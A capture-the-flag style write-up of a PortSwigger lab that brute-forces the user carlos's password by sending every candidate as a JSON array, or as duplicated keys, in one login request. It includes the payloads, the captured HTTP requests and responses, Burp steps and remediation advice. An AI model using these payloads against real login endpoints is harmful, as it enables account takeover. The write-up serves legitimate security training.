# Lab: Broken Brute-Force Protection, Multiple Credentials per Request

**Category:** Authentication → Password-based login → Brute-force protection
**Difficulty:** Expert
**Lab type:** PortSwigger Web Security Academy

## 🎯 Objective

Brute-force `carlos`'s password and access his account page. This lab is vulnerable because of a **logic flaw** in how its brute-force protection is implemented — not because protection is missing entirely.

- **Victim username:** `carlos`
- **Candidate passwords:**

```
123456 password 12345678 qwerty 123456789 12345 1234 111111 1234567 dragon
123123 baseball abc123 football monkey letmein shadow master 666666 qwertyuiop
123321 mustang 1234567890 michael 654321 superman 1qaz2wsx 7777777 121212
000000 qazwsx 123qwe killer trustno1 jordan jennifer zxcvbnm asdfgh hunter
buster soccer harley batman andrew tigger sunshine iloveyou 2000 charlie
robert thomas hockey ranger daniel starwars klaster 112233 george computer
michelle jessica pepper 1111 zxcvbn 555555 11111111 131313 freedom 777777
pass maggie 159753 aaaaaa ginger princess joshua cheese amanda summer love
ashley nicole chelsea biteme matthew access yankees 987654321 dallas austin
thunder taylor matrix mobilemail mom monitor monitoring montana moon moscow
```

---

## 🧠 The Vulnerability: Why This Works

Most brute-force defenses count in terms of **HTTP requests**: after N failed login *requests* from an IP, or N failed login *requests* against an account, the app blocks further attempts (IP ban, account lockout, CAPTCHA, exponential delay). That design makes a hidden assumption: **one request = one credential guess.**

This lab breaks that assumption. The login endpoint accepts JSON:

```json
{
  "username": "test",
  "password": "testp"
}
```

Nothing in the client enforces that `password` has to stay a single string. JSON itself is perfectly happy for a field to hold a string, a number, an array, or an object — it's the *server's* job to enforce that `password` must be a scalar. If the backend code doesn't strictly validate the type of that field, you can replace it with an **array** of every password you want to try:

```json
{
  "username": "carlos",
  "password": ["123456", "password", "12345678", "qwerty", "..."]
}
```

On the server, the authentication logic for this lab is effectively written as something like:

```
for each candidate in password_field:
    if check_password(username, candidate):
        return success
return failure
```

In other words, the developer's validation code happily iterates over whatever `password` turns out to be. If it's a string, it checks one guess. If it's an array, it loops through *every* guess in it, and returns success the moment **any one element matches**. Meanwhile, the brute-force counter upstream only sees that **one HTTP request** was made — so it increments once (if at all), no matter whether that request secretly carried 1 guess or 10,000. You've moved the brute-force attack from "many requests across the network, which is easy for a monitor to notice" to "one request, many comparisons on the CPU, which looks completely normal from the outside."

### Why this logic flaw exists in the first place

This usually isn't a deliberate design choice — it's what happens when:

1. **Dynamically-typed deserialization meets no schema validation.** Languages like Java, C#, Python and Node.js all have JSON libraries that will deserialize a field into a `List`/`Array` just as readily as a `String`, *unless* the developer explicitly pins the field's type with a strict schema (e.g., a DTO/model class that only exposes `password` as `String`, or a JSON Schema validator that rejects non-string types up front).
2. **The auth check is written generically "for convenience."** Sometimes this pattern is introduced on purpose — a developer wants one code path to support both a single login and some internal batch/testing tool — and that convenience code is never gated off from the public-facing endpoint.
3. **Brute-force protection and input validation are treated as two unrelated concerns.** The team bolted rate limiting onto the login *endpoint* (requests per minute), but never re-examined what counts as one "attempt" once the request body itself could smuggle a list.

The deeper lesson: **brute-force counters must count credential pairs actually evaluated, not HTTP requests received.** If the server can be tricked into evaluating 100 passwords per request, a limit of "5 requests per minute" is actually a limit of "500 passwords per minute" — brute-force protection in name only.

### A second variant of the same bug: JSON key pollution

PortSwigger's own support forum notes that this lab can also be solved a different way: instead of turning `password` into an array, you can submit the key twice in the raw JSON body:

```json
{
  "username": "carlos",
  "password": "wrong-guess-1",
  "password": "wrong-guess-2",
  "password": "peter"
}
```

A user on PortSwigger's forum reported that duplicating the `password` key with several candidate values worked against this lab too, with the server apparently willing to try each duplicated value rather than only the first or last one it saw. This works because the JSON spec never actually forbids duplicate keys in an object — it's left to each parser to decide what to do with them (keep the last one, keep the first one, or in some frameworks, silently coalesce duplicates into a list). It's the same root cause as the array trick: the server trusts the *shape* of client-supplied JSON instead of strictly enforcing it.

---

## 🛠️ Step-by-Step Walkthrough

### 1. Investigate the login page and capture a normal login request

The lab presents an ordinary login form.

![Login page](Images/Lab%2013/login-screen-inputting-testing-credentials.png)

Submitting a throwaway login (`test` / `testp`) with Burp's Proxy running captures the raw request. The key detail to notice is the `Content-Type: application/json` header and the JSON body — this is what makes the attack possible, since a traditional `application/x-www-form-urlencoded` body wouldn't let an array be smuggled in nearly as cleanly:

```
POST /login HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<...>
Content-Type: application/json
...

{
  "username":"test",
  "password":"testp"
}
```

![Captured JSON login request in Burp](Images/Lab%2013/request-of-testing-credentials.png)

Send this request to **Burp Repeater** (`Ctrl+R`, or right-click → *Send to Repeater*) — this is where the tampering happens.

### 2. Turn the password field into an array of every candidate

In Repeater, replace the single string value of `password` with a JSON array containing the entire candidate password list, keeping `username` set to the victim, `carlos`:

```json
{
  "username": "carlos",
  "password": [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica",
    "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom",
    "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess",
    "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole",
    "chelsea", "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom",
    "monitor", "monitoring", "montana", "moon", "moscow"
  ]
}
```

### 3. Send the request

Hit **Send**. The server loops through every password in the array against `carlos`'s stored hash. The one correct password matches somewhere in that list, so the login logic treats the whole request as a successful authentication. You get back a `302 Found`:

```
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=<new-authenticated-session-token>; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

![Array password request and 302 response showing /my-account?id=carlos](Images/Lab%2013/sending-every-password-with-single-username-in-repeater.png)

The `Location` header pointing to `/my-account?id=carlos` is the tell: the server has authenticated the request *as carlos*, and it did it with one HTTP call — not 97 separate ones that a request-counting rate limiter would have caught.

### 4. Open the response in the browser

Right-click the response pane and choose **Show response in browser** (some Burp versions label it *Open response in browser*). Burp spins up a one-time local URL. Opening that URL in your browser replays the captured response, including the `Set-Cookie: session=...` header — so your browser's cookie jar picks up the brand-new authenticated session cookie exactly as if the server had sent it to you directly. From there, following the page (or the `Location` redirect) lands you on `/my-account?id=carlos`, logged in as the victim.

> **Why this step is needed at all:** Repeater shows you the *response* to a request, but it isn't a browser — it doesn't execute redirects or hand session cookies over to a browsing session on its own. "Show response in browser" is Burp's bridge for exactly this situation: it lets you take a sensitive response you engineered in Repeater and actually *use* it as a live, cookie-bearing session in a real browser.

### 5. Confirm access to Carlos's account

The browser now shows Carlos's account page, confirming the authenticated session:

![My Account page showing username carlos](Images/Lab%2013/logged-in-as-carlos.png)

```
My Account
Your username is: carlos
```

Reaching this page (or clicking **My account**) solves the lab.

---

## 🌍 Real-World Parallel: This Isn't a PortSwigger-Only Trick

This exact class of bug — bundling many credential guesses into a single request to dodge request-counted rate limits — is well documented outside the lab environment, most often in **GraphQL APIs**, which batch operations by design.

OWASP's API Security Top 10 lists this under *Broken Authentication*: it warns that an API can be left open to brute-forcing a single account when there's no CAPTCHA or lockout mechanism, and it points to batching several GraphQL login mutations into one POST request as a concrete way attackers bypass request-counted rate limiting to speed the attack up — the exact same "many guesses, one request" idea as this lab, just carried over GraphQL's batching feature instead of a JSON array.

Researchers at Wallarm documented the identical pattern against live GraphQL applications: because batching lets several login attempts travel inside a single HTTP request, external rate-limiting monitors see nothing unusual even while many password guesses are evaluated server-side within that one request. They draw a direct line back to the older XML-RPC amplification brute-force attacks that plagued WordPress for years — same underlying idea of hiding many attempts inside one request, just a different protocol carrying it.

Checkmarx researchers went further and demonstrated it concretely: they batched 100 GraphQL login queries for one username against 100 different passwords into a single request, and exactly one of the hundred results came back holding a valid session token while the rest failed — a real login brute-forced in one HTTP call, mirroring what happens here the moment the correct password sits inside the submitted array. Their write-up adds a point worth carrying back to this lab: simply capping how many operations can be batched per request isn't a complete fix on its own — rate limiting ultimately has to be enforced per operation (per login attempt), not just per request.

The takeaway is the same whether the transport is a hand-crafted JSON array (this lab), a duplicated JSON key (the forum variant above), or a GraphQL batch (the cases above): **any time a server lets a client pack more than one "unit of work" into a single request, every security control that counts requests instead of units of work silently stops working.**

---

## 🔒 Remediation

- **Strict input-type validation.** The `password` field (and `username`) should be validated against a schema that only accepts a single string — reject arrays, objects, or duplicate keys with a `400 Bad Request` *before* the value ever reaches the authentication logic.
- **Count the right thing.** Brute-force counters, lockouts, and rate limits must key off the number of credential pairs actually checked server-side, not the number of HTTP requests received.
- **Defense in depth on login endpoints specifically.** Treat login (and password-reset) endpoints as higher-risk than the rest of the API: stricter schema enforcement, CAPTCHA after a handful of failures, and exponential backoff, regardless of how the attacker's request is shaped.
- **Disable or cap batching on sensitive operations.** Where batching (GraphQL or otherwise) is a legitimate feature elsewhere in the app, explicitly disable it for authentication/OTP-verification operations, or enforce the rate limit per-operation inside the resolver rather than per-request.

## 🧾 Conclusion

- **Root cause:** a missing type check on the `password` field let an array (or duplicated keys) stand in for a single password, and the server's login logic treated *any* matching element in that structure as a successful authentication.
- **Exploit:** sending every candidate password as one JSON array in a single `POST /login` request tests the entire wordlist server-side while request-counting brute-force protection only ever sees one request.
- **Fix:** validate that security-sensitive fields are exactly the scalar type expected, and make brute-force protections count credential attempts, not requests.

## 🔁 Alternate Solve: Burp Intruder (Sniper Attack)

The array trick above is the technique the lab is actually testing, but the same password list also cracks the account with a conventional **Burp Intruder Sniper attack** — sending the candidate passwords one request at a time instead of bundling them into a single array:

1. Send the captured `POST /login` request (with `username` set to `carlos`) to **Intruder**.
2. Clear the default payload markers, then mark only the `password` value as the single payload position:
   ```json
   {"username":"carlos","password":"§testp§"}
   ```
3. Attack type: **Sniper** (one payload position, one list of values).
4. Under **Payloads**, set the payload type to *Simple list* and paste in the full candidate password list, one per line.
5. Run the attack. Sort the results by the **Status** column — 96 requests return the normal failed-login status, and exactly one returns the `302 Found` that signals a successful login.
6. Take that one correct password and log in through the normal login form as `carlos` to reach `/my-account`.

This works here because the list of 97 candidates stays under whatever volume this particular instance's protection actually blocks at — so a plain one-guess-per-request Sniper attack never trips it. That's worth noting precisely *because* it's the exception, not the rule: in a lab built around IP-blocking or account-lockout (see the "Broken brute-force protection, IP block" writeup), the same Sniper attack would get cut off long before reaching the correct password, and the array/batching technique above would be the only way through. This lab's real lesson is still the type-validation flaw — the Sniper attack succeeding too is a side effect of this specific instance's threshold, not proof the protection is sound.

## 📚 References

- [PortSwigger — Lab: Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)
- [PortSwigger Forum — Possible bug in this lab (duplicate-key variant)](https://forum.portswigger.net/thread/possible-bug-in-broken-brute-force-protection-multiple-credentials-per-request-lab-e82a2882)
- [OWASP API Security Top 10 (2023) — API2:2023 Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [Wallarm — GraphQL Batching Attack](https://lab.wallarm.com/graphql-batching-attack/)
- [Checkmarx — "Didn't Notice Your Rate Limiting": GraphQL Batching Attack](https://checkmarx.com/blog/didnt-notice-your-rate-limiting-graphql-batching-attack/)
